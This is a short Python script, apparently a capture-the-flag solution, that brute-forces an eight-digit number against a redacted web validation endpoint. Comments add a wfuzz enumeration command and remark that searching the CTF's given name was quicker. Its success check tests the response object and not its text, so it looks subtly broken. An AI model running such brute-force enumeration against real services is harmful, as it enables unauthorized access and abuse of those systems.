#https://xxxxx/lade/valider/numberxxx

from datetime import datetime
import requests
URL ="https://xxxxxx"


session = requests.Session()

i=40000000
while i < 49999999:
    r = session.get(url = URL + str(i))
    print(r.json())
    print(str(i))
    if "true" in r:
        print(i)
        break
    i = i + 1


#98332280

#WAYYY faster with wfuzz:
#wfuzz -c -Z -w 900000000-99999999.txt https://xxxxx/FUZZ | grep -wv "41 Ch"

#Fastest solution was googleing the name provided in the CTF and finding the correct number that way. Bruteforce took about 15 hours on Ryzen 7 1700 in WSL ubuntu